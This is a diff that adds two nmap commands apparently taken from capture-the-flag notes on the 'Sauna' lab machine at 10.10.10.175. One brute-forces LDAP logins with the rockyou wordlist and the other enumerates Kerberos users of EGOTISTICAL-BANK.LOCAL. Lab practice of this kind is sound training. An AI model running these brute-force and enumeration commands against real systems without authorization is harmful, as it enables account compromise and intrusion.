@@ -1,0 +1,5 @@
+nmap -p 389 --script ldap-brute -d --script-args ldap.base='"CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL"',userdb=/usr/share/wordlists/rockyou.txt 10.10.10.175
+
+nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='EGOTISTICAL-BANK.LOCAL',userdb=/usr/share/wordlists/Seclists/Usernames/Names/names.txt 10.10.10.175
+
+
